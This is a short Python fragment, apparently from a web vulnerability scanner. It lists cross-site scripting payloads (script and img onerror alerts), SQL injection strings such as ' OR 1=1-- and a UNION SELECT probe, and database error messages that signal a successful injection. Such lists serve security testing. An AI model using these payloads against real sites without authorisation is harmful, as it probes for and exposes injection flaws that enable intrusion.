XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "'\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>"
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "' UNION SELECT NULL--"
]

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "ORA-"
]